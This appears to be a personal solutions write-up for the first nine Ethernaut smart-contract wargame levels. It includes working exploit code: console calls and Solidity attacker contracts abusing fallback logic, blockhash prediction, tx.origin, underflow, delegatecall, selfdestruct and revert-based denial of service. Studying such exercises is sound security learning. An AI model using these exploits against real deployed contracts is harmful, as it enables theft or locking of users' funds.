# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between the functions and fallback function
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly; becomes a regular function
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip
Don't rely on block number for any validation logic. I can calculate solution if both our txn in the same block and pass the result to your contract!
``` 
pragma solidity ^0.4.24;
import "./CoinFlip.sol";

contract CoinFlipSoln {
    CoinFlip private _victim;
    uint256 private lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) public {
        _victim = CoinFlip(_address);
    }
    
    function hackIt() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    _victim.flip(side);

  }
}
```

## 4. Telephone
Don't rely on tx.origin. Remember that when you call a contract (B) function from within another contract (A), the msg.sender is the address of A, not the account that you initiated the function from. The only way you can preserve msg.sender is through DelegateCall but that's another shit show by itself! Would avoid unless you know what you're doing.
```
pragma solidity ^0.4.24;
import "./telephone.sol";

contract HackIt {
    Telephone private telephone;
    
    constructor(address _address) public {
        telephone = Telephone(_address);
    }
    
    function hackIt() public {
        telephone.changeOwner(msg.sender);
    }
}
```

## 5. Token
Be careful of integer over/underflow. Always use safemath libraries. Basically I understood that no matter what parameter I entered as _value, it will always return a number that is > 0 because it's a uint therefore the require statement is as good as useless. 
```
await contract.transfer(instance, 25)
```

## 6. Delegation
Be very very careful when using delegatecall. msg.sender, msg.data, msg.value are all preserved. Always do a check to ensure that msg.data.length == 0 if you don't want them to call any function. https://solidity.readthedocs.io/en/v0.4.25/types.html#address for more info. All I had to do was trigger the fallback function (note that it is not payable) with "pwn()" as the msg.value. https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-sendtransaction
```
await contract.sendTransaction({data: web3.sha3("pwn()").slice(0, 10)})
```

## 7. Force
Even though your contract may not have a payable fallback function, you can still force ether transfers into your contract via selfdestruct or transaction fee rewards for mining a block. Do not ever assume that your contract will always have 0 balance and use it as part of validation.
```
pragma solidity ^0.4.24;

contract hackIt {
    
    address private _victim;
    
    constructor(address victim) public payable {
        _victim = victim;
    }
    
    function forceTransfer() public {
        selfdestruct(_victim);
    }
}
```

## 8. Vault
Essentially your private variables are completely exposed on a public chain simply by using a block explorer. The private visibility simply restricts other contracts from calling it. Ethereum stores data in 32 bytes slots. https://ethereum.stackexchange.com/questions/13910/how-to-read-a-private-variable-from-a-contract
1. Deploy contract in truffle to get ABI (inside of ./build/contracts), this tells you where the variable is stored (index 1)
2. truffle console --network ropsten to connect to ropsten (make sure your truffle.js is updated accordingly)
3. web3.eth.getStorageAt("contract address", index)

## 9. King
This is a classic example of DDoS with unexpected revert whereby when the contract tries to do a transfer back to you address (contract), your payable fallback function will simply revert (or if you don't have 1) thus ensuring that nobody can overtake your position as king. 
```
pragma solidity ^0.4.24;

contract KingForever {
    
    address private _victim;
    
    constructor(address victim) public payable {
        _victim = victim;
    }
    
    function throneIsMine() public {
        _victim.call.value(100000000000000)();
    }
    
    
    function() public payable {
        revert("The throne is mine forever");
    }
    
}
```





